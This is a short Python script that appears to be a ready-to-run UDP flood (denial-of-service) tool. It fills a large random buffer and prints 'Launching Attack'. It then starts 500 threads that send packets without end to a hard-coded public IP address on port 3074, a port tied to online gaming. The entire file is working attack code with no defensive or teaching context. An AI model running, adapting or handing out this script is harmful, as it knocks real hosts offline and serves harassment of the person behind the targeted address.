  
import sys
import os
import time
import threading
import socket
import random

bytes = random._urandom(65500)

ip = '98.155.64.207'
port = 3074

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
time.sleep(5)
print("Launching Attack")

def attack():
	while True:
		sock.sendto(bytes, (ip,port))
		sock.sendto(bytes, (ip,port))
		sock.sendto(bytes, (ip,port))
		sock.sendto(bytes, (ip,port))
		sock.sendto(bytes, (ip,port))

for i in range(500):
		thread = threading.Thread(target=attack)
		thread.setDaemon = True
		thread.start()


